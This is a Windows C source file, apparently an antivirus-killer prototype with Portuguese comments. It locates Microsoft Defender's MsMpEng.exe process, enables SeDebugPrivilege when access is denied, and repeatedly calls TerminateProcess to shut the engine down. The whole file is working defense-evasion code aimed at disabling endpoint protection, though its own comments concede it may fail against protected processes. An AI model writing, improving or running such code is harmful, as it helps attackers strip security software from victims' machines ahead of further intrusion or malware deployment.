// debug_truesight_improved.c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD getPID(const char* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[getPID] Snapshot failed: 0x%08X\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(pe32);
    DWORD pid = 0;
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return pid;
}

void printLastError(const char* prefix) {
    DWORD err = GetLastError();
    LPSTR msg = NULL;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&msg, 0, NULL);
    fprintf(stderr, "[%s] GetLastError=%lu -> %s\n", prefix, err, msg ? msg : "(no message)");
    if (msg) LocalFree(msg);
}

int enableSeDebugPrivilege(void) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printLastError("OpenProcessToken");
        return 0;
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        printLastError("LookupPrivilegeValue");
        CloseHandle(hToken);
        return 0;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printLastError("AdjustTokenPrivileges");
        CloseHandle(hToken);
        return 0;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        fprintf(stderr, "[enableSeDebugPrivilege] Privilege not held by this account.\n");
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);
    printf("[enableSeDebugPrivilege] SeDebugPrivilege enabled (ou já presente)\n");
    return 1;
}

int tryTerminateFromUserland(DWORD pid) {
    // 1) Tentar abrir com permissão limitada primeiro (melhor chance)
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, FALSE, pid);
    if (!h) {
        fprintf(stderr, "[fallback] OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_TERMINATE) failed for PID %lu\n", pid);
        printLastError("OpenProcess");
        // 2) Se for Access Denied, tenta habilitar SeDebug e tentar novamente
        if (GetLastError() == ERROR_ACCESS_DENIED) {
            fprintf(stderr, "[fallback] Access denied. Tentando habilitar SeDebugPrivilege e reabrir...\n");
            if (enableSeDebugPrivilege()) {
                h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, FALSE, pid);
                if (!h) {
                    fprintf(stderr, "[fallback] Re-OpenProcess falhou após SeDebugPrivilege.\n");
                    printLastError("OpenProcess");
                    return 0;
                }
            }
            else {
                fprintf(stderr, "[fallback] Não foi possível habilitar SeDebugPrivilege.\n");
                return 0;
            }
        }
        else {
            return 0;
        }
    }

    // Verifica se temos um handle
    if (!h) {
        fprintf(stderr, "[fallback] Sem handle para PID %lu\n", pid);
        return 0;
    }

    // Tentar TerminateProcess (pode falhar se o processo for PPL)
    if (!TerminateProcess(h, 1)) {
        fprintf(stderr, "[fallback] TerminateProcess falhou para PID %lu\n", pid);
        printLastError("TerminateProcess");
        CloseHandle(h);
        return 0;
    }

    printf("[fallback] Terminated PID %lu from userland\n", pid);
    CloseHandle(h);
    return 1;
}

int main(void) {
    const char* processName = "MsMpEng.exe";
    for (int i = 0; i < 10; i++) {
        DWORD pid = getPID(processName);
        if (pid == 0) {
            fprintf(stderr, "[!] Could not find PID for %s\n", processName);
            Sleep(1000);
            continue;
        }
        printf("[*] Found %s PID=%lu\n", processName, pid);

        // Tentativa de terminar do userland
        tryTerminateFromUserland(pid);

        Sleep(1000);
    }
    return 0;
}
